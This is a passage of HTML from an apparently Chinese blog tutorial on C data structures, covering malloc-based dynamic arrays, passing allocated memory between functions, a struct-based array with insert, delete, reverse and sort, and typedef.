class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//静态数组</span></span><br><span class="line">    <span class="type">int</span> a[<span class="number">5</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//动态数组</span></span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入需要分配数组的长度：length = &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;len);<span class="comment">//将输入写到len变量这个地址中去</span></span><br><span class="line">    len = <span class="number">5</span>;</span><br><span class="line">    <span class="type">int</span> * pArr = (<span class="type">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * len);</span><br><span class="line">    *pArr = <span class="number">4</span>;<span class="comment">//类似于a[0] = 4;</span></span><br><span class="line">    pArr[<span class="number">1</span>] = <span class="number">10</span>;<span class="comment">//类似于a[1] = 10;</span></span><br><span class="line">   </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        pArr[i] = i * i;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, &amp;pArr[i]);<span class="comment">//取动态数组的每个元素的地址并输出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(pArr);<span class="comment">//把pArr所代表的动态分配所有个字节的内存释放</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">//动态数组的地址也是连续的</span></span><br><span class="line"><span class="comment">009F6B18</span></span><br><span class="line"><span class="comment">009F6B1C</span></span><br><span class="line"><span class="comment">009F6B20</span></span><br><span class="line"><span class="comment">009F6B24</span></span><br><span class="line"><span class="comment">009F6B28</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><img src="/posts/79666db/1.4.1.jpg" class="" title="malloc分配动态数组"><h2 id="1-5-跨函数使用内存"><a href="#1-5-跨函数使用内存" class="headerlink" title="1.5 跨函数使用内存"></a>1.5 跨函数使用内存</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">10</span>;</span><br><span class="line">    i = f();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;i = %d\n&quot;</span>, i);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">return</span> j;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">i = 20</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">void f(int **q)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int s;</span></span><br><span class="line"><span class="comment">    *q = &amp;s;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">g</span><span class="params">(<span class="type">int</span> **q)</span></span><br><span class="line">&#123;</span><br><span class="line">    *q = (<span class="type">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> *p;</span><br><span class="line">    <span class="comment">//f(&amp;p);//p调用完f()还是野指针，因为调用完f()，f()中的局部变量都没了</span></span><br><span class="line">    g(&amp;p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> sid;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> Student * <span class="title function_">CreateStudent</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">ShowStudent</span><span class="params">(<span class="keyword">struct</span> Student *)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Student</span> * <span class="title">pst</span>;</span></span><br><span class="line">    pst = CreateStudent();</span><br><span class="line">    ShowStudent(pst);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> Student * <span class="title function_">CreateStudent</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Student</span> * <span class="title">p</span> =</span> (<span class="keyword">struct</span> Student *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Student));</span><br><span class="line">    p-&gt;sid = <span class="number">99</span>;</span><br><span class="line">    p-&gt;age = <span class="number">22</span>;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ShowStudent</span><span class="params">(<span class="keyword">struct</span> Student * ps)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, ps-&gt;sid, ps-&gt;age);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">99 22</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h1 id="2-线性结构"><a href="#2-线性结构" class="headerlink" title="2. 线性结构"></a>2. 线性结构</h1><h2 id="2-1-连续存储【数组】"><a href="#2-1-连续存储【数组】" class="headerlink" title="2.1 连续存储【数组】"></a>2.1 连续存储【数组】</h2><p>优点：存取速度快、方便查找</p><p>缺点：事先知道数组的长度、插入删除元素慢、空间通常有限制、需要大块连续内存</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Arr</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span>* pBase;<span class="comment">//存储的是数组第一个元素的地址</span></span><br><span class="line">    <span class="type">int</span> len;<span class="comment">//数组所能容纳的最大元素的个数</span></span><br><span class="line">    <span class="type">int</span> cnt;<span class="comment">//当前数组有效元素的个数</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_arr</span><span class="params">(<span class="keyword">struct</span> Arr*, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">append_arr</span><span class="params">(<span class="keyword">struct</span> Arr*, <span class="type">int</span>)</span>;<span class="comment">//追加</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">insert_arr</span><span class="params">(<span class="keyword">struct</span> Arr*, <span class="type">int</span>, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">delete_arr</span><span class="params">(<span class="keyword">struct</span> Arr*, <span class="type">int</span>, <span class="type">int</span>*)</span>;<span class="comment">//删除的元素放在int*</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">is_empty</span><span class="params">(<span class="keyword">struct</span> Arr*)</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">is_full</span><span class="params">(<span class="keyword">struct</span> Arr*)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sort_arr</span><span class="params">(<span class="keyword">struct</span> Arr*)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">show_arr</span><span class="params">(<span class="keyword">struct</span> Arr*)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">reverse_arr</span><span class="params">(<span class="keyword">struct</span> Arr*)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Arr</span> <span class="title">arr</span>;</span></span><br><span class="line">    init_arr(&amp;arr, <span class="number">6</span>);</span><br><span class="line">    show_arr(&amp;arr);</span><br><span class="line">    append_arr(&amp;arr, <span class="number">1</span>);</span><br><span class="line">    append_arr(&amp;arr, <span class="number">2</span>);</span><br><span class="line">    append_arr(&amp;arr, <span class="number">3</span>);</span><br><span class="line">    append_arr(&amp;arr, <span class="number">4</span>);</span><br><span class="line">    append_arr(&amp;arr, <span class="number">5</span>);</span><br><span class="line">    show_arr(&amp;arr);</span><br><span class="line">    insert_arr(&amp;arr, <span class="number">4</span>, <span class="number">99</span>);</span><br><span class="line">    show_arr(&amp;arr);</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    <span class="keyword">if</span> (delete_arr(&amp;arr, <span class="number">1</span>, &amp;val))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;删除成功！\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;您删除的元素是：%d\n&quot;</span>, val);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;删除失败！\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    show_arr(&amp;arr);</span><br><span class="line"></span><br><span class="line">    reverse_arr(&amp;arr);</span><br><span class="line">    show_arr(&amp;arr);</span><br><span class="line"></span><br><span class="line">    sort_arr(&amp;arr);</span><br><span class="line">    show_arr(&amp;arr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_arr</span><span class="params">(<span class="keyword">struct</span> Arr* pArr, <span class="type">int</span> length)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//(*pArr).len = 99;</span></span><br><span class="line">    pArr-&gt;pBase = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * length);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//分配内存失败，会把NULL赋值给pBase</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == pArr-&gt;pBase)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;动态内存分配失败！\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        pArr-&gt;len = length;</span><br><span class="line">        pArr-&gt;cnt = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">is_empty</span><span class="params">(<span class="keyword">struct</span> Arr* pArr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> == pArr-&gt;cnt)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">show_arr</span><span class="params">(<span class="keyword">struct</span> Arr* pArr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_empty(pArr))</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;数组为空！\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pArr-&gt;cnt; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, pArr-&gt;pBase[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">is_full</span><span class="params">(<span class="keyword">struct</span> Arr* pArr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (pArr-&gt;cnt == pArr-&gt;len)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">append_arr</span><span class="params">(<span class="keyword">struct</span> Arr* pArr, <span class="type">int</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//满时返回false</span></span><br><span class="line">    <span class="keyword">if</span> (is_full(pArr))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//没满时追加</span></span><br><span class="line">    pArr-&gt;pBase[pArr-&gt;cnt] = val;</span><br><span class="line">    pArr-&gt;cnt++;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">insert_arr</span><span class="params">(<span class="keyword">struct</span> Arr* pArr, <span class="type">int</span> pos, <span class="type">int</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_full(pArr))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;数组已满，不能进行插入操作！\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pos&lt;<span class="number">0</span> || pos&gt;pArr-&gt;cnt + <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;插入位置不合法！\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> tmp;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = pArr-&gt;cnt - <span class="number">1</span>; i &gt;= pos; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        pArr-&gt;pBase[i + <span class="number">1</span>] = pArr-&gt;pBase[i];</span><br><span class="line">    &#125;</span><br><span class="line">    pArr-&gt;pBase[pos] = val;</span><br><span class="line">    pArr-&gt;cnt++;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">delete_arr</span><span class="params">(<span class="keyword">struct</span> Arr* pArr, <span class="type">int</span> pos, <span class="type">int</span>* pVal)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_empty(pArr))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;数组为空，不能进行删除操作！\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pos&lt;<span class="number">0</span> || pos&gt;pArr-&gt;cnt<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;删除位置不合法！\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *pVal = pArr-&gt;pBase[pos];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = pos; i &lt; pArr-&gt;cnt - <span class="number">1</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        pArr-&gt;pBase[i] = pArr-&gt;pBase[i + <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    pArr-&gt;cnt--;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">reverse_arr</span><span class="params">(<span class="keyword">struct</span> Arr* pArr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> j = pArr-&gt;cnt - <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (i &lt; j)</span><br><span class="line">    &#123;</span><br><span class="line">        t = pArr-&gt;pBase[i];</span><br><span class="line">        pArr-&gt;pBase[i] = pArr-&gt;pBase[j];</span><br><span class="line">        pArr-&gt;pBase[j] = t;</span><br><span class="line">        ++i;</span><br><span class="line">        --j;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sort_arr</span><span class="params">(<span class="keyword">struct</span> Arr* pArr)</span></span><br><span class="line">&#123;<span class="comment">//选择排序</span></span><br><span class="line">    <span class="type">int</span> i, j, t;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; pArr-&gt;cnt<span class="number">-1</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = i+<span class="number">1</span>; j &lt; pArr-&gt;cnt; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (pArr-&gt;pBase[i] &gt; pArr-&gt;pBase[j])</span><br><span class="line">            &#123;</span><br><span class="line">                t = pArr-&gt;pBase[i];</span><br><span class="line">                pArr-&gt;pBase[i] = pArr-&gt;pBase[j];</span><br><span class="line">                pArr-&gt;pBase[j] = t;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-2-离散存储【链表】"><a href="#2-2-离散存储【链表】" class="headerlink" title="2.2 离散存储【链表】"></a>2.2 离散存储【链表】</h2><p>优点：空间没有限制、插入删除元素很快</p><p>缺点：存取速度慢</p><h3 id="2-2-1-typedef的用法"><a href="#2-2-1-typedef的用法" class="headerlink" title="2.2.1 typedef的用法"></a>2.2.1 typedef的用法</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//int为已经存在的数据类型，ZHANGSAN是给数据类型起个别名</span></span><br><span class="line"><span class="comment">//typedef int ZHANGSAN;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> sid;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">100</span>];</span><br><span class="line">    <span class="type">char</span> sex;</span><br><span class="line">&#125;ST;<span class="comment">//struct Student是已经存在的数据类型，ST是别名</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//ZHANGSAN i = 10;</span></span><br><span class="line">    <span class="comment">//printf(&quot;%d\n&quot;, i);</span></span><br><span class="line">    </span><br><span class="line">    ST st;<span class="comment">//等价于struct Student st;</span></span><br><span class="line">    st.sid = <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, st.sid);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 